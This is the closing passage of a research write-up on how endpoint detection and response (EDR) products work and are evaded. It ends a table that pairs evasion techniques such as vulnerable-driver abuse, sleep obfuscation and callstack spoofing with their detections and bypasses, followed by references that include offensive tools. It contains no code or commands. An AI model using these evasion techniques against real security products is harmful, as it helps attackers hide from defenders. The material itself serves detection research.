| BYOVD | Blocklist, HVCI | New CVEs | HVCI data-only isolation |
| Sleep obfuscation | PROTECTVM frequency | Randomized timing | Intel TDT behavior |
| Callstack spoof | Unwind validation | ROP desync | Prologue vs unwind consistency |

---

## References

- [blog.deeb.ch — (Anti-)EDR Compendium](https://blog.deeb.ch/posts/how-edr-works/)
- [0xdbgman — EDR Tradecraft: Internals, Detection, Evasion](https://0xdbgman.github.io/posts/edr-internals-research-and-bypass/)
- [n4r1b — Dissecting WdFilter.sys](https://n4r1b.com/posts/2020/01/dissecting-the-windows-defender-driver-wdfilter-part-1/)
- [Elastic Security Labs — Kernel ETW is the Best ETW](https://www.elastic.co/security-labs/kernel-etw-best-etw)
- [Elastic Security Labs — Doubling Down: ETW Callstacks](https://www.elastic.co/security-labs/doubling-down-etw-callstacks)
- [Quarkslab — WdNisDrv.sys Guided Tour](https://blog.quarkslab.com/guided-tour-inside-windefenders-network-inspection-driver.html)
- [EDRSandblast — wavestone-cdt](https://github.com/wavestone-cdt/EDRSandblast)
- [Praetorian — ETW Threat Intelligence and Hardware Breakpoints](https://www.praetorian.com/blog/etw-threat-intelligence-and-hardware-breakpoints/)
- [0xflux — Full Spectrum ETW Detection Against Rootkits](https://fluxsec.red/full-spectrum-event-tracing-for-windows-detection-in-the-kernel-against-rootkits)
- [Alice.climent-pommeret — Direct Syscalls: Hell's/Halo's/SysWhispers2](https://alice.climent-pommeret.red/posts/direct-syscalls-hells-halos-syswhispers2/)
- [FalconForce — MDE Internals 0x02](https://medium.com/falconforce/microsoft-defender-for-endpoint-internals-0x02-audit-settings-and-telemetry-1d0af3ebfb27)
- [CrowdStrike — Kernel Access and Security Architecture](https://www.crowdstrike.com/en-us/blog/tech-analysis-kernel-access-security-architecture/)
- [SCRT Team — Blinding EDRs: WFP Manipulation](https://blog.scrt.ch/2025/08/25/blinding-edrs-a-deep-dive-into-wfp-manipulation/)
- [arxiv:2508.03879 — RX-INT Kernel Engine](https://arxiv.org/html/2508.03879v1)
- [winternl.com — Detecting Manual Syscalls from User Mode](https://winternl.com/detecting-manual-syscalls-from-user-mode/)
- [cirosec.de — Windows Instrumentation Callbacks](https://cirosec.de/en/news/windows-instrumentation-callbacks/)
- [br-sn — Removing Kernel Callbacks Using Signed Drivers](https://br-sn.github.io/Removing-Kernel-Callbacks-Using-Signed-Drivers/)
- [SentinelOne SKREAM](https://github.com/Sentinel-One/SKREAM)
- [Microsoft Security Blog — Intel TDT](https://www.microsoft.com/en-us/security/blog/2021/04/26/defending-against-cryptojacking-with-microsoft-defender-for-endpoint-and-intel-tdt/)
- [ired.team — Kernel Callback Subscription](https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/subscribing-to-process-creation-thread-creation-and-image-load-notifications-from-a-kernel-driver)

---

*Document synthesized from primary research: blog.deeb.ch/posts/how-edr-works/, academic papers, Black Hat/DEF CON/BlueHat presentations, public PoC repositories, and kernel reverse engineering findings. Intended for defensive security research and detection engineering.*
